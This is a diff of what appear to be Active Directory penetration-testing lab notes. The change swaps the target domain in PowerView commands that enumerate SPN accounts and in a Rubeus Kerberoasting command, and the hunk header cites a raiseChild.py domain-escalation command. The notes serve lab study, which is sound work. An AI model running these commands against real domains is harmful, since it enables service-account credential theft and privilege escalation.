@@ -170,13 +170,13 @@ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_
 
 ```
 # Enumerating Accounts for Associated SPNs
-Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+Get-DomainUser -SPN -Domain INLANEFREIGHT.LOCAL | select SamAccountName
 
 # Enumerating the mssqlsvc Account
-Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
+Get-DomainUser -Domain INLANEFREIGHT.LOCAL -Identity mssqlsvc |select samaccountname,memberof
 
 # Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
-.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+.\Rubeus.exe kerberoast /domain:INLANEFREIGHT.LOCAL /user:mssqlsvc /nowrap
 ```
 
 
